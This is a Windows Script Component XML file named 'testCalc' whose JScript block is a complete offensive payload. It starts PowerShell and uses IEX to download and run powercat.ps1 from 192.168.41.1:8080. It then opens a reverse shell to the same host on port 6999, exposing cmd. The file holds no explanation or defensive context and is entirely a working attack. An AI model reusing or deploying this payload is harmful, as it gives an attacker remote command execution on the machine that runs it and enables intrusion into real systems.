<?xml version="1.0"?>

<package>
<component id="testCalc">

<script language="JScript">

var r = new ActiveXObject("WScript.Shell").Run("powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.41.1:8080/powercat-master/powercat.ps1');powercat -c 192.168.41.1 -p 6999 -e cmd"); 

</script>

</component>
</package>